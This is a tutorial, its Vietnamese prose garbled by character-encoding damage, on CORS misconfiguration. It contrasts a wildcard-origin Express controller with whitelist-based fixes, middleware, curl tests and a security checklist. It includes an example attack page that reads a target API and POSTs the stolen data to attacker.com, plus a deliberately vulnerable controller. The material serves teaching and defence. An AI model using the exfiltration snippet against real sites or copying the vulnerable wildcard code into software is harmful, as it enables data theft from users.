# CORS Misconfiguration - Lá»— há»•ng Báº£o máº­t Web

## ğŸ“Œ Tá»•ng Quan

**CORS (Cross-Origin Resource Sharing)** misconfiguration lÃ  má»™t lá»— há»•ng phá»• biáº¿n trong á»©ng dá»¥ng web hiá»‡n Ä‘áº¡i, cho phÃ©p káº» táº¥n cÃ´ng truy cáº­p dá»¯ liá»‡u nháº¡y cáº£m tá»« cÃ¡c trang web khÃ¡c.

## ğŸ”´ Lá»— Há»•ng: Access-Control-Allow-Origin: *

### NguyÃªn NhÃ¢n
```javascript
// âŒ INSECURE - Cho phÃ©p má»i nguá»“n
res.setHeader('Access-Control-Allow-Origin', '*')
```

Khi set `Access-Control-Allow-Origin: *`, mÃ¡y chá»§ cho phÃ©p **táº¥t cáº£ cÃ¡c domain** truy cáº­p tÃ i nguyÃªn nÃ y.

### TÃ¡c Äá»™ng (Data Exfiltration)

#### Ká»‹ch Báº£n Táº¥n CÃ´ng

1. **BÆ°á»›c 1**: Káº» táº¥n cÃ´ng táº¡o má»™t trang web Ä‘á»™c háº¡i (attacker.com)
2. **BÆ°á»›c 2**: Trang web nÃ y cháº¡y JavaScript Ä‘á»ƒ gá»i API cá»§a target.com
3. **BÆ°á»›c 3**: VÃ¬ target.com cÃ³ `Access-Control-Allow-Origin: *`, trÃ¬nh duyá»‡t cho phÃ©p request
4. **BÆ°á»›c 4**: Dá»¯ liá»‡u nháº¡y cáº£m bá»‹ exfiltrate Ä‘áº¿n mÃ¡y chá»§ cá»§a káº» táº¥n cÃ´ng

#### VÃ­ Dá»¥ Code Táº¥n CÃ´ng

```html
<!-- attacker.com/steal-data.html -->
<script>
  // Thá»±c hiá»‡n request Ä‘áº¿n trang cÃ³ lá»— há»•ng CORS
  fetch('https://target.com/api/insecure-data')
    .then(res => res.json())
    .then(data => {
      // Gá»­i dá»¯ liá»‡u bá»‹ Ä‘Ã¡nh cáº¯p Ä‘áº¿n server cá»§a káº» táº¥n cÃ´ng
      fetch('https://attacker.com/log-stolen-data', {
        method: 'POST',
        body: JSON.stringify(data)
      })
    })
</script>
```

#### Dá»¯ Liá»‡u Bá»‹ ÄÃ¡nh Cáº¯p
- API Keys
- User Tokens (JWT, Session ID)
- Personal Information (Email, Phone, Address)
- Payment Information
- Health Records
- Business Secrets

---

## âœ… Fix: Sá»­ Dá»¥ng CORS Whitelist

### CÃ¡ch Fix

```javascript
// âœ… SECURE - Chá»‰ cho phÃ©p nhá»¯ng domain Ä‘Æ°á»£c phÃ©p
const whitelist = ['https://trusted-site.com', 'https://app.example.com']

const corsOptions = {
  origin: function (origin, callback) {
    if (whitelist.indexOf(origin) !== -1 || !origin) {
      callback(null, true)
    } else {
      callback(new Error('Not allowed by CORS'))
    }
  },
  credentials: true,
  methods: ['GET', 'POST'],
  allowedHeaders: ['Content-Type']
}

app.use(cors(corsOptions))
```

### Best Practices

1. **KhÃ´ng dÃ¹ng Wildcard**: TrÃ¡nh `Access-Control-Allow-Origin: *`
2. **Use Whitelist**: Chá»‰ cho phÃ©p nhá»¯ng domain cáº§n thiáº¿t
3. **Use Environment Variables**: Quáº£n lÃ½ whitelist qua .env
4. **Set Credentials**: `credentials: true` khi cáº§n cookie
5. **Limit Methods**: Chá»‰ cho phÃ©p HTTP methods cáº§n thiáº¿t
6. **Validate Headers**: Kiá»ƒm soÃ¡t headers Ä‘Æ°á»£c phÃ©p

---

## ğŸ”§ Implementation Guide

### 1. Cáº­p nháº­t Controllers

#### Vulnerable Controller
```javascript
exports.insecureData = (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*') // âŒ VULNERABLE
  res.json({ apiKey: 'secret-key-123', userData: {...} })
}
```

#### Secure Controller
```javascript
exports.secureData = (req, res) => {
  const origin = req.headers.origin
  const whitelist = process.env.CORS_WHITELIST?.split(',') || []
  
  // âœ… Validate origin
  if (!whitelist.includes(origin)) {
    return res.status(403).json({ error: 'CORS policy violation' })
  }
  
  res.setHeader('Access-Control-Allow-Origin', origin)
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST')
  res.json({ apiKey: 'secret-key-123', userData: {...} })
}
```

### 2. Cáº¥u HÃ¬nh Environment

**`.env`**
```
CORS_WHITELIST=https://yourdomain.com,https://app.yourdomain.com,http://localhost:3000
ALLOWED_ORIGINS=https://yourdomain.com,https://app.yourdomain.com
```

### 3. Middleware Táº­p Trung

```javascript
// middlewares/cors.middleware.js
const corsMiddleware = (req, res, next) => {
  const whitelist = (process.env.CORS_WHITELIST || '')
    .split(',')
    .map(origin => origin.trim())
    .filter(Boolean)

  const origin = req.headers.origin

  res.setHeader('Vary', 'Origin')

  if (!whitelist.includes(origin)) {
    return res.status(403).json({
      error: 'CORS policy violation',
      message: 'Your origin is not allowed to access this resource'
    })
  }

  res.setHeader('Access-Control-Allow-Origin', origin)
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS')
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization')
  res.setHeader('Access-Control-Max-Age', '86400')

  if (req.method === 'OPTIONS') {
    return res.sendStatus(200)
  }

  next()
}

module.exports = corsMiddleware
```

---

## ğŸ“Š Comparison Table

| Aspect | Vulnerable | Secure |
|--------|-----------|--------|
| **CORS Header** | `*` (wildcard) | Specific origin |
| **Security** | âŒ Báº¥t ká»³ domain nÃ o cÅ©ng Ä‘Æ°á»£c | âœ… Chá»‰ domain Ä‘Æ°á»£c phÃ©p |
| **Data Exfiltration** | âŒ Dá»… bá»‹ Ä‘Ã¡nh cáº¯p | âœ… ÄÆ°á»£c báº£o vá»‡ |
| **Config** | Hardcoded | Environment variable |
| **Maintenance** | KhÃ³ quáº£n lÃ½ | Dá»… quáº£n lÃ½ |

---

## ğŸ§ª Testing

### Test Case 1: Insecure Endpoint
```bash
# Tá»« báº¥t ká»³ origin nÃ o cÅ©ng cÃ³ thá»ƒ truy cáº­p
curl -H "Origin: https://attacker.com" \
     https://target.com/api/insecure-data
# Response: 200 OK + sensitive data âŒ
```

### Test Case 2: Secure Endpoint (Not Whitelisted)
```bash
# Origin khÃ´ng trong whitelist bá»‹ reject
curl -H "Origin: https://attacker.com" \
     https://target.com/api/secure-data
# Response: 403 Forbidden âœ…
```

### Test Case 3: Secure Endpoint (Whitelisted)
```bash
# Origin trong whitelist Ä‘Æ°á»£c cháº¥p nháº­n
curl -H "Origin: https://trusted-site.com" \
     https://target.com/api/secure-data
# Response: 200 OK + CORS headers âœ…
```

---

## ğŸ”’ Security Checklist

- [ ] KhÃ´ng sá»­ dá»¥ng `Access-Control-Allow-Origin: *`
- [ ] Implement whitelist cho phÃ©p nhá»¯ng origin cáº§n thiáº¿t
- [ ] Validate origin trÃªn má»—i request
- [ ] Sá»­ dá»¥ng environment variables cho config CORS
- [ ] Set `Vary: Origin` header
- [ ] Limit HTTP methods
- [ ] Limit allowed headers
- [ ] Implement rate limiting trÃªn sensitive endpoints
- [ ] Sá»­ dá»¥ng HTTPS
- [ ] Monitor CORS violations
- [ ] Document táº¥t cáº£ allowed origins

---

## ğŸ“š References

- [MDN: CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
- [OWASP: CORS](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Origin_Resource_Sharing_Cheat_Sheet.html)
- [PortSwigger: CORS](https://portswigger.net/web-security/cors)

---

## ğŸ“ BÃ i Táº­p Thá»±c HÃ nh

1. XÃ¡c Ä‘á»‹nh lá»— há»•ng CORS trong project hiá»‡n táº¡i
2. Táº¡o báº£n fix sá»­ dá»¥ng whitelist
3. Test báº±ng cÃ¡ch táº¡o vulnerable site
4. Deploy lÃªn Render vÃ  test
5. Monitor CORS violations

---

**Created**: December 2024  
**Status**: Production Ready with Security Fixes
